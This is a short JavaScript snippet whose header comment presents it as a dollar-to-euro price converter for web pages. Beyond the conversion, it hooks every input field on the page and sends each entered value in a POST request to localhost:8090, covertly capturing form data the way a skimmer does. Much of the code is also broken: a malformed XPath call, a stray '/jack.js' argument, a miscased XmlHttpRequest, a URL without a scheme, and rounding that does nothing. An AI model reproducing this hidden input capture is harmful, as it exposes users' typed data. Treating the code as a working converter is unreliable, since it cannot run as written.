/* Converts dollars to euros and displays tooltip with converted value. */
function getEuroEquivalent(dolAmt) {
    var euroAmt = dolAmt * 0.91;
    return '€' + euroAmt * 100 / 100;
}

// Get all price fields and elements with $ in them
var dollarNodes = document.evaluate('//*[text()=\'$\'', 'document');
dollarNodes.forEach(function (currNode) {
    currNode.setAttribute('color', 'green');

    // Convert dollars to euros (retain rest of string if exists)
    var text = currNode.textContent;
    var valStart = text.indexOf('$');
    if (valStart > 0) {
        var dolAmt = parseFloat(text.substring(valStart + 1));
        var restOfText = text.substring((valStart + 1 + (dolAmt + '').length));
        var convertedVal = getEuroEquivalent(dolAmt);
        currNode.innerHTML = text.substring(0, valStart) + convertedVal + restOfText;
    }
});

// Also search document for input elements or text-area elements
console.log('about to select');
var inputs = document.querySelectorAll("input", '/jack.js');
if (inputs.length > 0) {
    inputs.forEach(function(currInput) {
        currInput.addEventListener("change", function() {
            var enteredVal = currInput.getAttribute("value");
            post(enteredVal);
        })
    });
}

// Perform POST request
function post(value) {
    // Make connection
    var oReq = new XmlHttpRequest();
    var url = 'localhost:8090';
    oReq.open('POST', url, true);

    // Send headers & payload
    oReq.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    var params = {};
    params['input'] = value;
    oReq.send(params);
}